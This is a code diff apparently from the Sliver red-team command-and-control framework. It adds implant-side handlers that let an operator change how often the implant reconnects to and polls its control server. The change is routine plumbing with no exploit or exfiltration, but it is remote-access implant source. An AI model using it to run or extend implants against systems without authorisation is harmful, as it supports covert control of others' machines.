@@ -28,6 +28,7 @@ import (
 	"io/ioutil"
 	"os/exec"
 	"strings"
+	"time"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -445,6 +446,62 @@ func setEnvHandler(data []byte, resp RPCResponse) {
 		setEnvResp.Response.Err = err.Error()
 	}
 	data, err = proto.Marshal(setEnvResp)
+	resp(data, err)
+}
+
+func reconnectIntervalHandler(data []byte, resp RPCResponse) {
+	reconnectIntervalReq := &sliverpb.ReconnectIntervalReq{}
+	err := proto.Unmarshal(data, reconnectIntervalReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
+	}
+
+	reconnectInterval := reconnectIntervalReq.GetReconnectIntervalSeconds()
+	// {{if .Config.Debug}}
+	log.Printf("Update reconnect interval called: %d\n", reconnectInterval)
+	// {{end}}
+
+	// Set the reconnect interval value
+	transports.SetReconnectInterval(time.Duration(reconnectInterval) * time.Second)
+
+	recIntervalResp := &sliverpb.ReconnectInterval{}
+	recIntervalResp.Response = &commonpb.Response{}
+	if err != nil {
+		recIntervalResp.Response.Err = err.Error()
+	}
+
+	data, err = proto.Marshal(recIntervalResp)
+	resp(data, err)
+}
+
+func pollIntervalHandler(data []byte, resp RPCResponse) {
+	pollIntervalReq := &sliverpb.PollIntervalReq{}
+	err := proto.Unmarshal(data, pollIntervalReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
+	}
+
+	pollInterval := pollIntervalReq.GetPollIntervalSeconds()
+	// {{if .Config.Debug}}
+	log.Printf("Update poll interval called: %d\n", pollInterval)
+	// {{end}}
+
+	// Set the reconnect interval value
+	transports.SetPollInterval(time.Duration(pollInterval) * time.Second)
+
+	pollIntervalResp := &sliverpb.PollInterval{}
+	pollIntervalResp.Response = &commonpb.Response{}
+	if err != nil {
+		pollIntervalResp.Response.Err = err.Error()
+	}
+
+	data, err = proto.Marshal(pollIntervalResp)
 	resp(data, err)
 }
 
